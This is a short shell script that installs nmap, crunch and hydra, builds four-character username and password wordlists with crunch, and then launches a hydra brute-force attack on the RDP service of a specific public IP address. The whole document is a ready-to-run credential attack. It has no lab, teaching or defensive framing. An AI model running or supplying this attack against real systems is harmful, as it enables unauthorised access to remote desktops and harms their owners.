sudo apt-get update -y && sudo apt-get upgrade -y
sudo apt-get autoremove -y
sudo apt install nmap
sudo apt install crunch
sudo apt install hydra

crunch 4 4 qwertyuiopasdfghjklzxcvbnm -d 1 >> users.txt
crunch 4 4 qwertyuiopasdfghjklzxcvbnm1234567890 -d 1 >> password.txt
hydra -V -L users.txt -P password.txt 13.81.100.177 -t 4 rdp